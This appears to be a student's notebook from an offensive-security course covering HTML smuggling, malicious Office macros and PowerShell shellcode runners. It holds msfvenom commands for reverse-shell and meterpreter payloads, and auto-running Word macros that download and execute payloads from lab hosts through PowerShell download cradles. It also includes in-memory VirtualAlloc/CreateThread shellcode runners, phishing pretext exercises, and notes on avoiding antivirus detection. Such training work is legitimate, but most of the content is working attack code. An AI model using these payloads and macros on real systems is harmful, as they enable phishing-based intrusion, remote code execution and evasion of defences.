# HTML smuggling

remember to use staged payload instead of non staged ones in meterpreter.

finally used 

```bash
┌──(kali㉿kali)-[~/codeplay/pen300/book/chapter3]
└─$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.6.12 LPORT=4444 -f exe -o /var/www/html/msfstaged.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: /var/www/html/msfstaged.exe
                                                                                                                                                                                                                                 
┌──(kali㉿kali)-[~/codeplay/pen300/book/chapter3]
└─$ base64 /var/www/html/msfstaged.exe

```
check the code : using new_html.html

### 3.1.3.1 Exercises
1. Repeat the HTML smuggling to trigger a download of a Meterpreter payload in a file format 
of your choosing.

2. Modify the smuggling code to also use the window.navigator.msSaveBlob62,63 method to 
make the technique work with Microsoft Edge as well.

The explot works in msedge also without any change.

# phishing with microsoft office

installing microsoft office 2016 from : `https://office-2016.fileplanet.com/download` - not verified.

### 3.2.1.1 Exercise
1. Install Microsoft Office on your Windows 10 client VM
done

## introduction to vba

creating a macro - view > macros

Leveraging existing methods like Document_Open() and AutoOpen()


```vb
Sub ss()
'
' ss Macro
'
'

Dim myLong As Long

myLong = 1

If myLong < 5 Then
    MsgBox ("True")
Else
    MsgBox ("False")
End If

End Sub

```

macro for calling cmd.exe

```vb
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    MsgBox ("This is a macro test")
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
End Sub

```

Remember to save docx macro compatible.

## 3.2.2.1 Exercises
1. Experiment with VBA programming basics by creating a small macro that prints the current 
username and computer name 5 times using the Environ$ function.

```vb
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim iCnt As Integer
    Dim sEnvVariable As String
    
    MsgBox Environ("USERNAME") + Environ("USERNAME")
     
End Sub

```

2. Create an Excel macro that runs when opening an Excel spreadsheet and executes cmd.exe 
using Workbook_Open

```vb
Sub Workbook_Open()
    myMacro

End Sub


Sub myMacro()
    MsgBox ("yello")
End Sub

```
# Let Powershell help us

Powershell is rendered on th efly using .NET framework

using powershell to do a download and execute script

`PS C:\Users\aonno> (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', `

using a word macro to execute powershell script

```vb
Sub Document_Open()
 MyMacro
End Sub
Sub AutoOpen()
 MyMacro
End Sub
Sub MyMacro()
 Dim str As String
 str = "powershell (New-Object 
System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 
'msfstaged.exe')"
 Shell str, vbHide
 Dim exePath As String
 exePath = ActiveDocument.Path + "\msfstaged.exe"
 Wait (2)
 Shell exePath, vbHide
End Sub
Sub Wait(n As Long)
 Dim t As Date
 t = Now
 Do
 DoEvents
 Loop Until Now >= DateAdd("s", n, t)
End Sub
Listing 3
```

### .2.3.1 Exercises
1. Replicate the Word macro to obtain a reverse shell. Implement it in Excel.

2. Experiment with another PowerShell download cradle like Invoke-WebRequest.

```bash
PS C:\Users\aonno> Invoke-WebRequest "https://raw.githubusercontent.com/fanbyprinciple/pen300/master/README.md"


StatusCode        : 200
StatusDescription : OK
Content           : # pen300
                    
                    Repository for doing pen300 exercises.
                    Need to start with book.
                    
                    Will add multiple folders for various blogs/ resources.
                    
RawContent        : HTTP/1.1 200 OK
                    Connection: keep-alive
                    Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; sandbox
                    Strict-Transport-Security: max-age=31536000
                    X-Content-Type-Options: nosniff
                    ...
Forms             : {}
Headers           : {[Connection, keep-alive], [Content-Security-Policy, default-src 'none'; style-src 'unsafe-inline'; sandbox], 
                    [Strict-Transport-Security, max-age=31536000], [X-Content-Type-Options, nosniff]...}
Images            : {}
InputFields       : {}
Links             : {}
ParsedHtml        : mshtml.HTMLDocumentClass
RawContentLength  : 131
```

# Keeping up appearances

how to base64encode content using macro

### 3.3.2.1 Exercises
1. Create a convincing phishing pretext Word document for your organization or school that 
replaces text after enabling macros.
2. Insert a procedure called MyMacro that downloads and executes a Meterpreter payload after 
the text has been switched

# Executing shellcode in word memory

We shall try to execute payloads directly from memory

We need to convert native data types into vba data types
for example in

```
BOOL GetUserNameA(
 LPSTR lpBuffer,
 LPDWORD pcbBuffer
)
```
LPSTR is a pointer to a string so VBA the string object holds the pointer to a string rather than the string itself.

Second argument is a pointer of a reference to a DWORD. so we use byref to get a reference. 

Bool can be long

so we design the macro as

```vb
Function MyMacro()
 Dim res As Long
 Dim MyBuff As String * 256
 Dim MySize As Long
 MySize = 256
 
 res = GetUserName(MyBuff, MySize)
 strlen = InStr(1, MyBiff, vbNullChar) - 1
 MsgBox Left$(MyBuff, strlen)
End Function
```

but getting error executing

![](./problem_with_win32_vba.png)


https://www.aeternusconsulting.com/how-to-use-windows-api-in-vba/#:~:text=Function%20GetSystemDirectory%20Lib%20%E2%80%9Ckernel32%E2%80%9D%3A%20This%20tells%20VBA%20that,library%2C%20the%20Windows%20API%E2%80%99s%20actual%20name%20is%20GetSystemDirectoryA.


A Windows API function must be declared correctly at the top of a VBA code module. The declaration statement will tell the VBA virtual machine 3 important pieces of information.
1. The Window API function name you would like to use.
2. The Library location of the the Windows API function.
3. The Window API function’s arguments.

Here is an example:

Declare PtrSafe Function GetSystemDirectory Lib "kernel32" _
Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

How to Deal with 32-bit Excel and 64-bit Excel (2021 edit)
Tip 1: Use PtrSafe for 64-bit Excel
To ensure a Windows API function call will work in 64-bit Excel, we need the keyword “PtrSafe” somewhere in the Windows API declaration. Without this, you will get an error.

Tip 2: Use LongPtr for 64-bit Excel
VBA now includes the variable type alias LongPtr. The actual data type that LongPtr resolves to depends on the version of Office that it is running in; LongPtr resolves to Long in 32-bit versions of Office. For Windows API code to work in 64-bit versions of Office, replace all Long and LongLong datatypes to LongPtr.

Tip 3: Use conditional compiler directives
If you need your WIndows API function call to be compatible in both 32-bit and 64-bit Excel, we need to declare two versions of the function declaration by using conditional compiler directives.

The following is an example to show all 3 tips in action. The codes in bold are the recommended changes for 64-bit Excel. You can read the long and complicated reference from Microsoft: 64-bit Visual Basic for Applications overview (if you want).

#If VBA7 Then
    'for 64-bit Excel
    Declare PtrSafe Function GetSystemDirectory Lib "kernel32" _
    Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As LongPtr) As LongPtr
#Else
    'for 32-bit Excel
    Declare Function GetSystemDirectory Lib "kernel32" _
    Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
#End If

This works

```vb
Declare PtrSafe Function GetSystemDirectory Lib "kernel32" _
Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long


'***************************************************
'Purpose: invoke the Windows API GetSystemDirectoryA
'***************************************************
Sub SystemsDir()
    Dim strSysPath As String * 255 'declare a fixed length string of 255 characters
    MsgBox Left(strSysPath, GetSystemDirectory(strSysPath, 255))
End Sub

```

Lets try to use it with GetUserNameA

```vb
Declare PtrSafe Function GetUserName Lib "advapi32" _
Alias "GetUserNameA" (ByVal lpBuffer As String, ByVal pcbBuffer As Long) As Long

Function MyMacro()
 Dim res As Long
 Dim MyBuff As String * 256
 Dim MySize As Long
 Dim strlen As Long
 MySize = 256
 
 res = GetUserName(MyBuff, MySize)
 strlen = InStr(1, MyBuff, vbNullChar) - 1
 MsgBox Left(MyBuff, strlen)
End Function

Sub new_s()
    MyMacro
End Sub

```

This actually reopens the document. NOt working.


### 3.4.1.1 Exercises
1. Replicate the call to GetUserName and return the answer.
2. Import the Win32 MessageBoxA110 API and call it using VBA
3. 
```
return type res -> long
int MessageBoxA(
  [in, optional] HWND   hWnd,
  [in, optional] LPCSTR lpText, -> string
  [in, optional] LPCSTR lpCaption, -> string
  [in]           UINT   uType -> long
);
```

So trying in VBA
```vb
Declare PtrSafe Function MessageBoxA Lib "user32" _
(ByVal hwnd As Long, ByVal LpText As String, ByVal lpCaption As String, ByVal uType As Long) As Long

Sub new_message()
    Dim h As Long
    Dim L As String
    Dim C As String
    Dim u As Long
    Dim res As Long
    
    h = 0
    L = "s"
    C = "s"
    u = 0
    res = MessageBoxA(h, L, C, u)
End Sub


```

This works!

![](./messagebox.png)

# VBA Shellcode Runner

We need to implement 3 functions - VirtualAlloc, RtlMoveMemory, CreateThread

```
LPVOID VirtualAlloc(
 LPVOID lpAddress,
 SIZE_T dwSize,
 DWORD flAllocationType,
 DWORD flProtect
);
```

To declare them

```vb
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As 
LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As 
Long) As LongPtr
```

Now for our vbaapplication payload
Difference between staged and non staged meterpreter payload

```vb
Payload Staged  Stageless
Reverse TCP	windows/meterpreter/reverse_tcp	windows/meterpreter_reverse_tcp
Reverse HTTPS	windows/meterpreter/reverse_https	windows/meterpreter_reverse_https
Bind TCP	windows/meterpreter/bind_tcp	windows/meterpreter_bind_tcp
Reverse TCP IPv6	windows/meterpreter/reverse_ipv6_tcp	windows/meterpreter_reverse_ipv6_tcp
```

amd note the use of exitfuntion below -


```bash
┌──(root㉿kali)-[/home/kali]
└─# msfvenom -p windows/meterpreter_reverse_https LHOST=10.10.6.12 LPORT=443 EXITFUNC=thread -f vbapplication > vba_payload.txt
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 176220 bytes
Final size of vbapplication file: 570462 bytes

```

Arguments fo virtualAlloc - we should supply the value "0" as lpadress, dwSize - to be set dynamically. 

we will use 0x3000 whuch equates to MEM_COMMIT and MEM_RESERVE 
hex notation in vba is &H3000

```vb
Dim buf As Variant
Dim addr As LongPtr
buf = Array(232, 130, 0, 0, 0, 96, 137...
addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
```

for RTL movememory

```
VOID RtlMoveMemory(
 VOID UNALIGNED *Destination,
 VOID UNALIGNED *Source,
 SIZE_T Length
);
```

```vb
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As 
LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Dim counter As Long
Dim data As Long
For counter = LBound(buf) To UBound(buf)
 data = buf(counter)
 res = RtlMoveMemory(addr + counter, data, 1)
Next counter
```

next is createThread

```
HANDLE CreateThread(
 LPSECURITY_ATTRIBUTES lpThreadAttributes,
 SIZE_T dwStackSize,
 LPTHREAD_START_ROUTINE lpStartAddress,
 LPVOID lpParameter,
 DWORD dwCreationFlags,
 LPDWORD lpThreadId
);
```

Vba implementation

```vb
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes 
As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As 
LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
```

```vb
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes 
As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As 
LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
```
full implementation giiven in `shellcode_runner.macro`

getting error of too many line continuations

### 3.4.2.1 Exercise
1. Recreate the shellcode runner in this section.

Too many line continuations errpr

solutions - can we have simpler reverse shell code
- can we somehow try and use limited line continuations?

# Powershell shellcode runner

problem with macro - it is saved onto disk, executed directly into memory.

we will have macro download a powershell script form web and run it in memory.

Calling win32 API from powershell

wiki for .NET developers

http://www.pinvoke.net/

```
int MessageBox(
 HWND hWnd,
 LPCTSTR lpText,
 LPCTSTR lpCaption,
 UINT uType
);
```

we will try to implement this in C# and the call MessageBox


```vb
[DllImport("user32.dll", SetLastError = true, CharSet= CharSet.Auto)]
public static extern int MessageBox(IntPtr hWnd, String text, String caption, uint type);

```

Using p/invoke APIs

```vb
using System;
using System.Runtime.InteropServices;
public class User32 {
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int MessageBox(IntPtr hWnd, String text, 
 String caption, int options)
 ```

complete powershell code 

```C#
$User32 = @"
using System;
using System.Runtime.InteropServices;
public class User32 {
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int MessageBox(IntPtr hWnd, String text, 
 String caption, int options);
}
"@
Add-Type $User32
[User32]::MessageBox(0, "This is an alert", "MyBox", 0)
```

### 3.5.1.1 Exercises
1. Import and call MessageBox using Add-Type as shown in this section.

![](./c%23_in_powershell.png)

2. Apply the same techniques to call the Win32 GetUserName API.

after doing google search for pinvoke getusername we get

```vb
[DllImport("advapi32.dll", SetLastError = true)]
static extern bool GetUserName(System.Text.StringBuilder sb, ref Int32 length);
```

```ps1
$bufCharCount=0
$infobuf="initial"
$advapi32 = @"
using System;
using System.Text;
using System.Runtime.InteropServices;
public class Class1
    {
        [DllImport("Advapi32.dll")]
        public static extern bool GetUserName(StringBuilder lpBuffer, ref int nSize);    
    }
"@
Add-Type $advapi32
$res=[Class1]::GetUserName($infobuf, [ref]$bufCharCount)


#Write-Host "Helloword"
Write-Host [Class1]::GetUserName($infobuf, [ref]$bufCharCount)
Write-Host $infobuf
Write-Host $bufCharCount
Write-Host $res
Write-Host "In reverse order?"

```
But not working

![](./c%23_in_powershell_getusername.png)

# Porting Shellcode Runner to PowerShell

Following the same function VirtualAlloc and Creathread for executing shellcode.

However this time, instead of RTLMoveMemory we will be using Copy function of the powerhsell.

```ps1
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
 [DllImport("kernel32")]
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint 
flAllocationType, uint flProtect);
 [DllImport("kernel32", CharSet=CharSet.Ansi)]
 public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint 
dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr 
lpThreadId);
}
"@
Add-Type $Kernel32
```

Generating shellcode using msfvenom, we will ue a calc function to do it.

```bash
msfvenom --platform windows --arch x64  -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -b '\x00\x0A\x0D' -f ps1
     

```

The combined code is put in `calc.ps1`

```ps1
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
 [DllImport("kernel32")]
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint 
flAllocationType, uint flProtect);
 [DllImport("kernel32", CharSet=CharSet.Ansi)]
 public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint 
dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr 
lpThreadId);
[DllImport("kernel32.dll", SetLastError=true)]
 public static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
 UInt32 dwMilliseconds);
}
"@
Add-Type $Kernel32

[Byte[]] $buf = 'add code here'
$size = $buf.Length
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")

```

that pops a calc

Now calling the download and execute from a word macro

```vb
Sub MyMacro()
 Dim str As String
 str = "powershell (New-Object System.Net.WebClient).DownloadString('http://10.10.6.12/calc.ps1') | IEX"
 'str = "calc.exe"
 Shell str, vbHide
End Sub
Sub Document_Open()
 MyMacro
End Sub
Sub AutoOpen()
 MyMacro
End Sub
```

Since right now our shell uses powershell as the parent process, it will terminate as soon as the powershell terminates so instead of that we should waitforsingleobjec api

```C#
[DllImport("kernel32.dll", SetLastError=true)]
 public static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
 UInt32 dwMilliseconds);

 ....

 [Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

### 3.5.2.1 Exercises
1. Replicate the PowerShell shellcode runner used in the section.
2. Is it possible to use a different file extension like .txt for the run.ps1 file?

yes its is possible to 
![](./calc1.png)

# Keep that powershell in memory

the Add-Type keyword lets us use the .NET framework to compile C# 
code containing Win32 API declarations and then call them.

we will use procmonitor with a simple powershell command

```ps1
$User32 = @"
using System;
using System.Runtime.InteropServices;
public class User32 {
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int MessageBox(IntPtr hWnd, String text, String caption, int 
options);
}
"@
Add-Type $User32
[User32]::MessageBox(0, "This is an alert", "MyBox", 0)
```

Not able to find `rtylilrr.dll` in any of the code

in order to list the loaded assemblies we can use 

```ps1

PS C:\Users\misthios> $User32 = @"
using System;
using System.Runtime.InteropServices;
public class User32 {
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int MessageBox(IntPtr hWnd, String text, String caption, int 
options);
}
"@
Add-Type $User32
[User32]::MessageBox(0, "This is an alert", "MyBox", 0)
1

PS C:\Users\misthios> [appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-Table fullname

FullName                                                                                                        
--------                                                                                                        
Accessibility, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a                                
Anonymously Hosted DynamicMethods Assembly, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null               
MetadataViewProxies_7d5f5fef-59b3-410c-9685-a330c87facbb, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null 
Microsoft.GeneratedCode, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null                                  
Microsoft.Management.Infrastructure, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35          
Microsoft.PowerShell.Commands.Utility, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35        
Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35                  
Microsoft.PowerShell.GPowerShell, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35             
Microsoft.PowerShell.GraphicalHost, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35           
Microsoft.PowerShell.ISECommon, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35               
Microsoft.PowerShell.Security, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35                
mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089                                     
ofjuz5bk, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null                                                 
powershell_ise, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35                               
PresentationCore, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35                             
PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35                        
PresentationFramework.Aero2, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35                  
PresentationFramework-SystemCore, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089             
PresentationFramework-SystemData, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089             
PresentationFramework-SystemXml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089              
SMDiagnostics, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089                                
System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089                                       
System.ComponentModel.Composition, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089            
System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a                         
System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a                 
System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089                                  
System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089                                  
System.DirectoryServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a                     
System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a                               
System.Management, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a                            
System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35                 
System.Numerics, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089                              
System.Runtime.InteropServices.WindowsRuntime, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
System.Runtime.Serialization, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089                 
System.ServiceModel.Internals, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35                
System.Transactions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089                          
System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089                         
System.Xaml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089                                  
System.Xml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089                                   
UIAutomationProvider, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35                         
UIAutomationTypes, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35                            
Windows.UI, Version=255.255.255.255, Culture=neutral, PublicKeyToken=null, ContentType=WindowsRuntime           
WindowsBase, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35    
```

we can use `file-list` or `format-table *` to see all columns of a powershell cmdlets


I cant find rtylilrr file.

but book mentions

```
Our investigation reveals that PowerShell writes a C# source code file (.cs) to the hard drive, 
which is compiled into an assembly (.dll) and then loaded into the process.
The Add-Type code will likely be flagged by endpoint antivirus, which will halt our attack. We’ll 
need to rebuild our PowerShell shellcode runner to avoid this.
```

### .6.1.1 Exercises
1. Execute the Add-Type MessageBox PowerShell code and capture the source code and 
assembly being written to disk.
2. Does the current PowerShell shellcode runner write files to disk?

not done both

# Leveraging UnsafeNativeMethods

problem with our current shellcode -

```
Add-Type and DllImport keywords (or the Declare keyword in VBA). 
However, Add-Type calls the csc compiler, which writes to disk. We must avoid this if we want to 
operate completely in-memory.
```

To dynamically find the function address we need to leveragge win32 apis -  GetModuleHandle and GetProcAddress.

code to find the existing assmblies

```ps1
$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
$Assemblies |
 ForEach-Object {
 $_.GetTypes()|
 ForEach-Object {
 $_ | Get-Member -Static| Where-Object {
 $_.TypeName.Contains('Unsafe')
 }
 } 2> $null
 }
```

It stands to reason that we could search the preloaded assemblies for the presence of 
GetModuleHandle and GetProcAddress, but we can also narrow the search more specifically. For 
example, when C# code wants to directly invoke Win32 APIs it must provide the Unsafe142
keyword. Furthermore, if any functions are to be used, they must be declared as static to avoid 
instantiation

```ps1
PS C:\Users\misthios> $Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
$Assemblies |
 ForEach-Object {
 $_.Location
 $_.GetTypes()|
 ForEach-Object {
 $_ | Get-Member -Static| Where-Object {
 $_.TypeName.Equals('Microsoft.Win32.UnsafeNativeMethods')
 }
 } 2> $null
 }
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorlib.dll


   TypeName: Microsoft.Win32.UnsafeNativeMethods

Name                             MemberType Definition                                                                                                                                                                                                         
----                             ---------- ----------                                                                                                                                                                                                         
Equals                           Method     static bool Equals(System.Object objA, System.Object objB)                                                                                                                                                         
ReferenceEquals                  Method     static bool ReferenceEquals(System.Object objA, System.Object objB)                                                                                                                                                
C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell_ISE.exe
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\Microsoft.PowerShell.ISECommon\v4.0_3.0.0.0__31bf3856ad364e35\Microsoft.PowerShell.ISECommon.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\System.dll
ClearEventLog                    Method     static bool ClearEventLog(System.Runtime.InteropServices.SafeHandle hEventLog, System.Runtime.InteropServices.HandleRef lpctstrBackupFileName)                                                                     
CreateWindowEx                   Method     static System.IntPtr CreateWindowEx(int exStyle, string lpszClassName, string lpszWindowName, int style, int x, int y, int width, int height, System.Runtime.InteropServices.HandleRef hWndParent, System.Runtim...
DefWindowProc                    Method     static System.IntPtr DefWindowProc(System.IntPtr hWnd, int msg, System.IntPtr wParam, System.IntPtr lParam)                                                                                                        
DestroyWindow                    Method     static bool DestroyWindow(System.Runtime.InteropServices.HandleRef hWnd)                                                                                                                                           
DispatchMessage                  Method     static int DispatchMessage([ref] Microsoft.Win32.NativeMethods+MSG, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089 msg)                                                                 
Equals                           Method     static bool Equals(System.Object objA, System.Object objB)                                                                                                                                                         
GetClassInfo                     Method     static bool GetClassInfo(System.Runtime.InteropServices.HandleRef hInst, string lpszClass, Microsoft.Win32.NativeMethods+WNDCLASS_I, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089 wc) 
GetDC                            Method     static System.IntPtr GetDC(System.IntPtr hWnd)                                                                                                                                                                     
GetFileVersionInfo               Method     static bool GetFileVersionInfo(string lptstrFilename, int dwHandle, int dwLen, System.Runtime.InteropServices.HandleRef lpData)                                                                                    
GetFileVersionInfoSize           Method     static int GetFileVersionInfoSize(string lptstrFilename, [ref] int handle)                                                                                                                                         
GetModuleFileName                Method     static int GetModuleFileName(System.Runtime.InteropServices.HandleRef hModule, System.Text.StringBuilder buffer, int length)                                                                                       
GetModuleHandle                  Method     static System.IntPtr GetModuleHandle(string modName)                                                                                                                                                               
GetNumberOfEventLogRecords       Method     static bool GetNumberOfEventLogRecords(System.Runtime.InteropServices.SafeHandle hEventLog, [ref] int count)                                                                                                       
GetOldestEventLogRecord          Method     static bool GetOldestEventLogRecord(System.Runtime.InteropServices.SafeHandle hEventLog, [ref] int number)                                                                                                         
GetProcAddress                   Method     static System.IntPtr GetProcAddress(System.IntPtr hModule, string methodName), static System.IntPtr GetProcAddress(System.Runtime.InteropServices.HandleRef hModule, string lpProcName)                            
GetProcessWindowStation          Method     static System.IntPtr GetProcessWindowStation()                                                                                                                                                                     
GetStdHandle                     Method     static System.IntPtr GetStdHandle(int type)                                                                                                                                                                        
GetSystemMetrics                 Method     static int GetSystemMetrics(int nIndex)                                                                                                                                                                            
GetUserObjectInformation         Method     static bool GetUserObjectInformation(System.Runtime.InteropServices.HandleRef hObj, int nIndex, Microsoft.Win32.NativeMethods+USEROBJECTFLAGS, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c56...
IsWindow                         Method     static bool IsWindow(System.Runtime.InteropServices.HandleRef hWnd)                                                                                                                                                
KillTimer                        Method     static bool KillTimer(System.Runtime.InteropServices.HandleRef hwnd, System.Runtime.InteropServices.HandleRef idEvent)                                                                                             
LookupAccountSid                 Method     static int LookupAccountSid(string systemName, byte[] pSid, System.Text.StringBuilder szUserName, [ref] int userNameSize, System.Text.StringBuilder szDomainName, [ref] int domainNameSize, [ref] int eUse)        
MsgWaitForMultipleObjectsEx      Method     static int MsgWaitForMultipleObjectsEx(int nCount, System.IntPtr pHandles, int dwMilliseconds, int dwWakeMask, int dwFlags)                                                                                        
NotifyChangeEventLog             Method     static bool NotifyChangeEventLog(System.Runtime.InteropServices.SafeHandle hEventLog, Microsoft.Win32.SafeHandles.SafeWaitHandle hEvent)                                                                           
PeekMessage                      Method     static bool PeekMessage([ref] Microsoft.Win32.NativeMethods+MSG, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089 msg, System.Runtime.InteropServices.HandleRef hwnd, int msgMin, int m...
PostMessage                      Method     static bool PostMessage(System.Runtime.InteropServices.HandleRef hwnd, int msg, System.IntPtr wparam, System.IntPtr lparam)                                                                                        
ReadDirectoryChangesW            Method     static bool ReadDirectoryChangesW(Microsoft.Win32.SafeHandles.SafeFileHandle hDirectory, System.Runtime.InteropServices.HandleRef lpBuffer, int nBufferLength, int bWatchSubtree, int dwNotifyFilter, [ref] int ...
ReadEventLog                     Method     static bool ReadEventLog(System.Runtime.InteropServices.SafeHandle hEventLog, int dwReadFlags, int dwRecordOffset, byte[] buffer, int numberOfBytesToRead, [ref] int bytesRead, [ref] int minNumOfBytesNeeded)     
ReferenceEquals                  Method     static bool ReferenceEquals(System.Object objA, System.Object objB)                                                                                                                                                
RegisterClass                    Method     static int16 RegisterClass(Microsoft.Win32.NativeMethods+WNDCLASS, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089 wc)                                                                   
ReleaseDC                        Method     static int ReleaseDC(System.IntPtr hWnd, System.IntPtr hDC)                                                                                                                                                        
ReportEvent                      Method     static bool ReportEvent(System.Runtime.InteropServices.SafeHandle hEventLog, int16 type, uint16 category, uint32 eventID, byte[] userSID, int16 numStrings, int dataLen, System.Runtime.InteropServices.HandleRe...
SelectObject                     Method     static System.IntPtr SelectObject(System.IntPtr hDC, System.IntPtr hObject)                                                                                                                                        
SendMessage                      Method     static System.IntPtr SendMessage(System.Runtime.InteropServices.HandleRef hWnd, int msg, System.IntPtr wParam, System.IntPtr lParam)                                                                               
SetClassLong                     Method     static System.IntPtr SetClassLong(System.Runtime.InteropServices.HandleRef hWnd, int nIndex, System.IntPtr dwNewLong)                                                                                              
